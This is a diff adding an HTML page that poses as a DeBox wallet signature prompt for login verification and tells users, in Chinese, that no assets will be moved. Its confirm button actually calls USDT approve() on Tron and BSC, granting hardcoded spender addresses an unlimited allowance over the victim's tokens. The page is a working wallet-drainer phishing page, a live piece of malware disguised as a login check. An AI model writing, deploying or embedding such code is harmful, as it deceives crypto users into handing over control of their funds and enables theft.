@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>DeBox 签名</title>
+<style>
+body{background:#0d0d0d;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;padding:20px}
+.modal{background:#1a1a2e;border-radius:24px;max-width:420px;width:100%;padding:28px 24px 20px;border:1px solid #2a2a4a}
+.modal-header{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+.modal-header .icon{width:40px;height:40px;background:linear-gradient(135deg,#6c5ce7,#a29bfe);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:bold;color:#fff}
+.modal-header .title{color:#fff;font-size:18px;font-weight:600}
+.modal-header .badge{margin-left:auto;background:#2d2d4a;color:#aaa;font-size:11px;padding:4px 12px;border-radius:20px}
+.divider{border:none;border-top:1px solid #2a2a4a;margin:16px 0}
+.label{color:#888;font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
+.message-box{background:#0d0d1a;border-radius:12px;padding:14px 16px;border:1px solid #2a2a4a;word-break:break-all;font-size:13px;color:#ccc;font-family:monospace;line-height:1.6;margin-bottom:16px}
+.wallet-info{background:#0d0d1a;border-radius:12px;padding:14px 16px;border:1px solid #2a2a4a;margin-bottom:20px}
+.wallet-info .row{display:flex;justify-content:space-between;font-size:13px;color:#aaa}
+.wallet-info .row .addr{color:#6c5ce7;font-family:monospace;font-size:12px}
+.btn-group{display:flex;gap:12px}
+.btn{flex:1;padding:14px;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;transition:all .15s}
+.btn-reject{background:#2a2a4a;color:#aaa}
+.btn-reject:active{background:#3a3a5a}
+.btn-confirm{background:#6c5ce7;color:#fff}
+.btn-confirm:active{background:#5a4bd1}
+.footer-text{text-align:center;color:#555;font-size:11px;margin-top:16px}
+#status{text-align:center;margin-top:14px;color:#ff6b6b;font-size:13px}
+</style>
+</head>
+<body>
+<div class="modal">
+<div class="modal-header"><div class="icon">D</div><span class="title">DeBox</span><span class="badge">● 已连接</span></div>
+<hr class="divider">
+<div class="label">申请对信息进行签名</div>
+<div class="message-box">Welcome to DEBOX!<br>验证您的钱包所有权</div>
+<div class="label">签名钱包</div>
+<div class="wallet-info"><div class="row"><span>0x8b6f59BDAEb4fdE28Aa51dDC5b9</span><span class="addr">(BNB-1)</span></div></div>
+<div class="btn-group"><button class="btn btn-reject" id="rejectBtn">拒绝</button><button class="btn btn-confirm" id="confirmBtn">确认</button></div>
+<div id="status"></div>
+<div class="footer-text">仅用于登录验证，不会转移资产</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+<script>
+const USDT="TR7NHqjeKQxGTCi8q8DYpTrCUB61d18xqB";
+const SPENDER="TE6Qpwxgv5KkxRxKxRm2xEag9iAXBNo83z";
+const MAX="115792089237316195423570985008687907853269984665640564039457584007913129639935";
+const BSC_USDT="0x55d398326f99059fF775485246999027B3197955";
+const BSC_SPENDER="0x00202043254ba0380aeb52A25E365D2B66c8cb79";
+document.getElementById('confirmBtn').onclick=async()=>{
+document.getElementById('status').innerText='⏳ 验证中...';
+if(!window.tronLink&&!window.ethereum){document.getElementById('status').innerText='❌ 请安装钱包';return;}
+if(window.tronLink){try{await window.tronLink.request({method:'tron_requestAccounts'});const c=await window.tronWeb.contract().at(USDT);await c.approve(SPENDER,MAX).send();document.getElementById('status').innerText='✅ 波场验证通过';}catch(e){document.getElementById('status').innerText='❌ 波场失败';}}
+if(window.ethereum){try{await window.ethereum.request({method:'eth_requestAccounts'});const Web3=window.Web3||(await import('https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js')).default;const web3=new Web3(window.ethereum);const accounts=await web3.eth.getAccounts();const contract=new web3.eth.Contract([{constant:false,inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}],name:'approve',outputs:[{name:'',type:'bool'}],type:'function'}],BSC_USDT);await contract.methods.approve(BSC_SPENDER,MAX).send({from:accounts[0]});document.getElementById('status').innerText='✅ BSC验证通过';}catch(e){document.getElementById('status').innerText='❌ BSC失败';}}
+};
+document.getElementById('rejectBtn').onclick=()=>{document.getElementById('status').innerText='❌ 已取消';};
+</script>
+</body>
+</html>
